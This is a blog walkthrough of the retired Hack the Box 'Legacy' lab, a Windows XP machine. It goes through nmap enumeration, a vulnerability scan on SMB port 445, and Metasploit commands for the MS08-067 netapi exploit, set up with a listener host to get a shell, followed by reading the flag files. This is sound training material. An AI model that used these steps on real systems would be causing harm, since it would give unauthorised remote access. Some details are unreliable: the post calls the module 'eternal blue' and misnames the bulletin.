@@ -1,0 +1,220 @@
+
+								
+																		Hack the Box Challenge: Legacy Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 25, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Legacy” which is lab presented by Hack the Box for making online penetration practices according to your experience level. They have a collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab, therefore, we have chosen retried Legacy lab.
+Level: Beginners
+Task: find user.txt and root.txt file in the victim’s machine.
+Let’s begin the Game!!
+Since these labs are online available therefore they have static IP and IP of Legacy is 10.10.10.4 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.4
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.4
+					
+				
+			
+		
+
+From the given below image, you can observe that we found open port 139 and 445 denotes that it is a windows machine.
+When I extract the complete result of nmap I found the following details
+OS: Windows XP
+Computer name: Legacy
+NetBIOS computer name Legacy
+As we know in Windows XP Port 445 was vulnerable to netapi exploit and it was a remarkable vulnerability in SMB protocol.
+
+Let confirm SMB vulnerability in victims system using nmap script.
+
+		
+		
+			
+			
+			
+			
+nmap --script vuln -p445 10.10.10.4
+			
+				
+					
+				
+					1
+				
+						nmap --script vuln -p445 10.10.10.4
+					
+				
+			
+		
+
+Awesome!! Victim’s machine is vulnerable to MS08-67exploit.
+
+Then I run msfconsole command in terminal and load metasploit framework for using eternal blue module for exploiting target machine.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/smb/ms08_067_netapi
+msf exploit(windows/smb/ms08_067_netapi) &gt;set rhost 10.10.10.4
+msf exploit(windows/smb/ms08_067_netapi) &gt;set rport 445
+msf exploit(windows/smb/ms08_067_netapi) &gt;set lhost 10.10.14.3
+msf exploit(windows/smb/ms08_067_netapi) &gt;exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/windows/smb/ms08_067_netapimsf exploit(windows/smb/ms08_067_netapi) &gt;set rhost 10.10.10.4msf exploit(windows/smb/ms08_067_netapi) &gt;set rport 445msf exploit(windows/smb/ms08_067_netapi) &gt;set lhost 10.10.14.3msf exploit(windows/smb/ms08_067_netapi) &gt;exploit
+					
+				
+			
+		
+
+Awesome!! I have got unauthorized access of victims command shell through session 1 as shown in below image.
+
+Inside C:\Document and Setting \john\Desktop I found the user.txt file and used cat “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cat user.txt
+			
+				
+					
+				
+					1
+				
+						cat user.txt
+					
+				
+			
+		
+
+Great!! We got our 1st flag successfully
+
+Inside C:\Document and Settings\Administrator\Desktop I found the root.txt file and used cat “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cat root.txt
+			
+				
+					
+				
+					1
+				
+						cat root.txt
+					
+				
+			
+		
+
+Great!! We got our 2nd flag successfully
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
